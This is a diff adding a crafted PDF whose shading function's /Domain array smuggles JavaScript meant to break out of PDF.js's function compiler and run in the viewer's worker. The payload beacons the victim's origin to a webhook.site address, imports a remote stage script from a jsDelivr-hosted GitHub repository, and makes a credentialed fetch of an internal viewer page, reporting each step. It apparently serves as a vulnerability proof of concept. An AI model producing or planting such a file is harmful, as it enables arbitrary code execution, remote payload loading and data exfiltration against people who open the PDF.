@@ -1,0 +1,79 @@
+%PDF-1.7
+%‚„œ”
+
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>
+endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842]
+   /Resources << /ColorSpace << /Pattern /Pattern >> /Pattern << /P1 4 0 R >> >>
+   /Contents 7 0 R
+>>
+endobj
+
+4 0 obj
+<< /Type /Pattern /PatternType 2 /Shading 5 0 R >>
+endobj
+
+5 0 obj
+<< /ShadingType 2 /ColorSpace /DeviceRGB /Coords [0 0 595 0]
+   /Domain [0 1] /Function 6 0 R /Extend [true true]
+>>
+endobj
+
+6 0 obj
+<< /FunctionType 4
+   /Domain [0 (1, src[srcOffset + 0]\)\);try{\(function\(\){
+var marker='PDFJS_WORKER_CODE_EXECUTED';
+var markerUrl='https://cdn.jsdelivr.net/gh/Johnson666666/MarkDown-Pictures@main/20260701_1552_pdfjs_webhook_marker.txt?ts=20260701_1552';
+var stageUrl='https://cdn.jsdelivr.net/gh/Johnson666666/MarkDown-Pictures@main/20260701_1552_pdfjs_webhook_stage.js?ts=20260701_1552';
+var webhook='https://36.webhook.site/80f0e3ea-047f-4cc9-85d0-135e41459ca3';
+var target='/igi/orion-platform/static/js/pdfjs/web/viewer.html';
+function enc\(v\){try{return encodeURIComponent\(String\(v\)\);}catch\(e\){return 'enc_error';}}
+function msg\(e\){try{return e&&e.message||String\(e\);}catch\(_\){return 'stringify_error';}}
+function hit\(stage,extra\){try{fetch\(webhook+'?stage='+enc\(stage\)+'&marker='+enc\(marker\)+'&origin='+enc\(self.location&&\(self.location.origin||self.location.href\)\)+\(extra||''\),{mode:'no-cors',credentials:'omit',cache:'no-store'}\).catch\(function\(\){}\);}catch\(e\){console.warn\('PDFJS_WEBHOOK_ERR',msg\(e\)\);}}
+console.warn\('\\u8fd9\\u662f PDF.js Worker \\u4efb\\u610f JS \\u6267\\u884c\\u6f0f\\u6d1e'\);
+console.warn\(marker, self.location && \(self.location.origin || self.location.href\)\);
+hit\('worker_payload_start',''\);
+fetch\(markerUrl,{credentials:'omit',cache:'no-store'}\).then\(function\(r\){return r.text\(\).then\(function\(t\){console.warn\('PDFJS_JSDELIVR_FETCH_OK','status='+r.status,'body='+t.slice\(0,80\)\);hit\('jsdelivr_marker_fetch_ok','&status='+r.status+'&len='+t.length\);}\);}\).catch\(function\(e\){console.warn\('PDFJS_JSDELIVR_FETCH_ERR',msg\(e\)\);hit\('jsdelivr_marker_fetch_err','&err='+enc\(msg\(e\)\)\);}\);
+try{importScripts\(stageUrl\);console.warn\('PDFJS_JSDELIVR_IMPORT_OK',stageUrl\);hit\('jsdelivr_import_ok',''\);}catch\(e\){console.warn\('PDFJS_JSDELIVR_IMPORT_ERR',msg\(e\)\);hit\('jsdelivr_import_err','&err='+enc\(msg\(e\)\)\);}
+fetch\(target,{credentials:'include',cache:'no-store'}\).then\(function\(r\){return r.text\(\).then\(function\(t\){console.warn\('PDFJS_SAME_ORIGIN_FETCH_OK','status='+r.status,'length='+t.length\);hit\('same_origin_fetch_ok','&status='+r.status+'&len='+t.length\);}\);}\).catch\(function\(e\){console.warn\('PDFJS_SAME_ORIGIN_FETCH_ERR',msg\(e\)\);hit\('same_origin_fetch_err','&err='+enc\(msg\(e\)\)\);}\);
+}\)\(\)}catch\(e\){try{console.warn\('PDFJS_15188_TOP_ERROR',e&&e.message\)}catch\(_\){}}//)]
+   /Range [0 1 0 1 0 1]
+   /Length 11
+>>
+stream
+{ dup dup }
+endstream
+endobj
+
+7 0 obj
+<< /Length 37 >>
+stream
+/Pattern cs
+/P1 scn
+0 0 595 842 re
+f
+endstream
+endobj
+
+xref
+0 8
+0000000000 65535 f 
+0000000016 00000 n 
+0000000066 00000 n 
+0000000148 00000 n 
+0000000320 00000 n 
+0000000387 00000 n 
+0000000520 00000 n 
+0000003030 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+3117
+%%EOF
